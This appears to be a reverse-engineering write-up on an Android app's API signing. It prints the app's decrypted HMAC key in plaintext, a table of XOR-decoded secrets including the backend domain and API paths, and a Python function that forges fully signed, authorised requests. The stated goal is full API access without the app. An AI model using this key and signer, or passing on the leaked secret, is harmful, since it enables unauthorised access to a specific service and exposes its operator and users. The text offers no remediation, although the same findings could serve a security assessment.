## 1. HMAC SIGNING KEY EXTRACTION

### Vulnerability
The HMAC signing key (pepper) is stored as XOR-encrypted byte arrays in
`MikuNative.smali` and decrypted at runtime via `libmiku.so` native code.

### Extraction Method
XOR every byte of the encrypted array with key `0x5d`.

### Pepper
```
MikuSecureV3_YanzzMasterKey2026_UltraGuard
```

### Signing Algorithm (verified 142/142 requests)
```python
import hmac, hashlib, uuid, time

PEPPER = "[REDACTED]"
TOKEN  = "miku_[REDACTED]"

def sign_request(path, token=TOKEN):
    ts   = int(time.time())
    hour = ts // 3600
    nonce = uuid.uuid4().hex[:16]
    h1   = hmac.new(PEPPER.encode(), f"{token}:{hour}".encode(), hashlib.sha256).hexdigest()
    sig  = hmac.new(h1.encode(), f"{path}|{ts}|{nonce}".encode(), hashlib.sha256).hexdigest()
    return {
        "X-Miku-Signature": sig,
        "X-Miku-Timestamp": str(ts),
        "X-Miku-Nonce": nonce,
        "X-Miku-Device-Id": "52b807e726458e93",
        "X-Miku-Device-Model": "HONOR LGN-NX1",
        "X-Miku-Brand": "HONOR",
        "X-Miku-OS-Version": "Android 16 (API 36)",
        "Authorization": f"Bearer {token}",
        "X-Miku-Auth": "vps",
    }
```

# BLAST RADIUS
Forge ANY API request. Full API access without APK.

### XOR Key Table (all MikuNative secrets)
```
Variable          XOR Key  Result
ENC_PEPPER        0x5d     MikuSecureV3_YanzzMasterKey2026_UltraGuard
ENC_BASE_URL      0x5d     https://panel.mikunime.web.id
ENC_MIKU_API      0x5d     https://panel.mikunime.web.id/api/miku/7/9
ENC_API_PREFIX    0x5d     /api/miku/7/9
ENC_DOMAIN        0x5d     panel.mikunime.web.id
ENC_SIGNATURE     0x5d     X-Miku-Signature
ENC_TIMESTAMP     0x5d     X-Miku-Timestamp
ENC_NONCE         0x5d     X-Miku-Nonce
ENC_AUTH          0x5d     vps
ENC_DEVICE_ID     0x5d     X-Miku-Device-Id
ENC_DEVICE_MODEL  0x5d     X-Miku-Device-Model
ENC_BRAND         0x5d     X-Miku-Brand
ENC_OS_VERSION    0x5d     X-Miku-OS-Version
```

### Token Location
Static field `zr.c` — VPS authentication token (NOT Firebase).

